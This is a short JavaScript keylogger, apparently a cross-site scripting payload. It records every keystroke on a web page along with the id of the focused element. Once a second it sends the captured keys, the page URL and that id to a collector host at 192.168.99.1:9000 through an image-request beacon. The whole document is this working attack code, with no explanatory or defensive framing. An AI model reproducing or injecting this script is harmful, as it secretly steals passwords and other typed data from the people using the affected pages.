var keys='';
var object = '';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	object = e.target.id
}
window.setInterval(function(){
	console.log("object" + object)
	new Image().src = 'http://192.168.99.1:9000/CatchKeyLog?data='+keys+'&page='+window.location.href+'&object='+object ;
	keys = '';
}, 1000);